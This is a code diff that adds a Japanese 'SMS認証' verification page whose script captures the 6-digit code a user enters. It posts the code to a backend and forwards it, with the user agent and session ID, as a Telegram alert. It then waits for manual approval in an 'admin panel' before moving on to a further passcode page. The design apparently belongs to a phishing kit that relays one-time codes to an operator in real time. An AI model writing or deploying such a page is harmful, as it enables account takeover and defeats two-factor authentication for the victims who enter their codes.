@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS認証</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Hiragino Sans', sans-serif; background-color: #ffffff; padding: 0 16px; display: flex; justify-content: center; min-height: 100vh; padding-top: 16px; }
+        .container { width: 100%; max-width: 400px; }
+        .header { display: flex; align-items: center; margin-bottom: 24px; }
+        .back-btn { font-size: 22px; background: none; border: none; cursor: pointer; color: #3c4043; padding: 0; margin-right: 8px; }
+        .header-title { font-size: 18px; font-weight: 500; color: #202124; }
+        .message-banner { display: none; margin-bottom: 16px; padding: 12px; border-radius: 8px; border-left: 4px solid #ff5252; background-color: #ffebee; }
+        .message-banner.show { display: block; }
+        .message-banner-title { font-size: 13px; font-weight: 600; color: #c62828; margin-bottom: 4px; }
+        .message-banner-text { font-size: 12px; color: #b71c1c; }
+        .content { text-align: center; margin-top: 40px; }
+        .instruction { font-size: 15px; color: #5f6368; margin-bottom: 32px; line-height: 1.6; }
+        .code-input { width: 100%; border: none; border-bottom: 2px solid #dadce0; font-size: 28px; font-weight: 300; text-align: center; letter-spacing: 8px; padding: 12px 0; color: #202124; background-color: transparent; font-family: inherit; }
+        .code-input:focus { outline: none; border-bottom-color: #1f71b8; }
+        .code-input::placeholder { color: #ccc; }
+        .next-btn { display: none; width: 100%; padding: 10px; background-color: #1f71b8; color: #ffffff; border: none; border-radius: 4px; font-size: 15px; font-weight: 500; cursor: pointer; margin-top: 24px; font-family: inherit; }
+        .next-btn.show { display: block; }
+        .next-btn:active { background-color: #185abc; }
+        .next-btn.loading { display: flex; align-items: center; justify-content: center; }
+        .spinner { display: inline-block; width: 14px; height: 14px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.6s linear infinite; margin-left: 6px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .help-link { margin-top: 24px; }
+        .help-link a { color: #1f71b8; text-decoration: none; font-size: 14px; font-weight: 500; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <button class="back-btn">←</button>
+            <span class="header-title">SMS認証</span>
+        </div>
+
+        <div class="message-banner" id="messageBanner">
+            <div class="message-banner-title" id="bannerTitle"></div>
+            <div class="message-banner-text" id="bannerText"></div>
+        </div>
+
+        <div class="content">
+            <div class="instruction">SMSで届いた認証番号6桁を<br>入力してください</div>
+            <input type="text" class="code-input" placeholder="123456" maxlength="6" inputmode="numeric">
+            <button class="next-btn">次へ</button>
+            <div class="help-link"><a href="#">届かない場合</a></div>
+        </div>
+    </div>
+
+    <script>
+        const codeInput = document.querySelector('.code-input');
+        const nextBtn = document.querySelector('.next-btn');
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('sessionId') || localStorage.getItem('loginSessionId');
+        if (!sessionId) { window.location.href = 'login.html'; }
+        localStorage.setItem('loginSessionId', sessionId);
+
+        const smsSessionId = sessionId + '_sms';
+
+        codeInput.addEventListener('input', () => {
+            const code = codeInput.value.trim();
+            nextBtn.classList.toggle('show', /^\d{6}$/.test(code));
+        });
+
+        nextBtn.addEventListener('click', async () => {
+            const code = codeInput.value.trim();
+            if (!/^\d{6}$/.test(code)) return;
+
+            nextBtn.disabled = true;
+            nextBtn.classList.add('loading');
+            nextBtn.innerHTML = '確認中<span class="spinner"></span>';
+
+            const userAgent = navigator.userAgent;
+            const timestamp = new Date().toLocaleString('ja-JP');
+
+            try {
+                // ===== STEP 1: api.php にリクエスト登録 =====
+                const apiRes = await fetch('/api/auth', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId: sessionId,
+                        action: 'pending',
+                        type: 'SMS_REQUEST',
+                        code: code,
+                        userAgent: userAgent,
+                        timestamp: timestamp
+                    })
+                });
+
+                const apiData = await apiRes.json();
+                console.log('✅ SMS API登録:', apiData);
+
+                // ===== STEP 2: Telegram 通知 =====
+                const telegramMsg = `
+🟡 <b>SMS認証コード入力</b>
+
+📱 認証コード: <code>${code}</code>
+📱 User-Agent: <code>${userAgent.substring(0, 80)}</code>
+🔑 セッションID: <code>${sessionId}</code>
+⏰ 時刻: ${timestamp}
+
+<b>管理画面で承認待機中...</b>
+                `;
+
+                await fetch('/api/notify', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message: telegramMsg })
+                }).catch(err => console.error('Telegram error:', err));
+
+                console.log('✅ SMS Telegram送信:', sessionId);
+
+                // ===== STEP 3: 管理画面の承認待機 =====
+                monitorApproval(sessionId);
+
+            } catch (error) {
+                console.error('❌ エラー:', error);
+                showBanner('エラー', 'SMS認証に失敗しました。');
+                nextBtn.disabled = false;
+                nextBtn.classList.remove('loading');
+                nextBtn.innerHTML = '次へ';
+            }
+        });
+
+        function monitorApproval(sid) {
+            let checkCount = 0;
+            const checker = setInterval(async () => {
+                checkCount++;
+                try {
+                    const res = await fetch(`/api/auth?sessionId=${sid}&_t=${Date.now()}`);
+                    const data = await res.json();
+
+                    if (data.approved) {
+                        clearInterval(checker);
+                        console.log('✅ SMS承認:', sid);
+                        window.location.href = `passcode-confirm.html?sessionId=${sid}`;
+                    } else if (data.rejected) {
+                        clearInterval(checker);
+                        console.log('❌ SMS拒否:', sid);
+                        showBanner('認証拒否', '管理者により拒否されました。');
+                        codeInput.value = '';
+                        nextBtn.classList.remove('show');
+                        nextBtn.disabled = false;
+                        nextBtn.classList.remove('loading');
+                        nextBtn.innerHTML = '次へ';
+                    }
+                } catch (err) {
+                    console.error('Check error:', err);
+                }
+
+                if (checkCount >= 120) {
+                    clearInterval(checker);
+                    showBanner('タイムアウト', '応答がありません。');
+                    nextBtn.disabled = false;
+                    nextBtn.classList.remove('loading');
+                    nextBtn.innerHTML = '次へ';
+                }
+            }, 500);
+        }
+
+        function showBanner(title, text) {
+            document.getElementById('bannerTitle').textContent = title;
+            document.getElementById('bannerText').textContent = text;
+            document.getElementById('messageBanner').classList.add('show');
+            setTimeout(() => document.getElementById('messageBanner').classList.remove('show'), 5000);
+        }
+
+        function sendTelegramNotification(message) {
+            fetch('/api/notify', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ message })
+            }).catch(e => console.error(e));
+        }
+
+        document.querySelector('.back-btn').addEventListener('click', () => {
+            window.location.href = 'login.html';
+        });
+
+        codeInput.focus();
+    </script>
+</body>
+</html>
